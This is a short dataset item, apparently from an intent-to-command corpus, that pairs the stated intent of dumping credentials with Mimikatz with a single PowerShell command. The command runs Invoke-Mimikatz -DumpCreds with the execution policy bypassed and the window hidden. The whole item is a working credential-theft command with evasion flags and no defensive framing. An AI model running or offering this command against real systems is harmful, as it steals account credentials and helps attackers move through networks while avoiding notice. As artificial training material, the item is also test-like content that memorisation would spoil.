# Natural language intent:
# Invoke Mimikatz to dump credentials with specified PowerShell options.

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -WindowStyle Hidden -Command "Invoke-Mimikatz -DumpCreds"
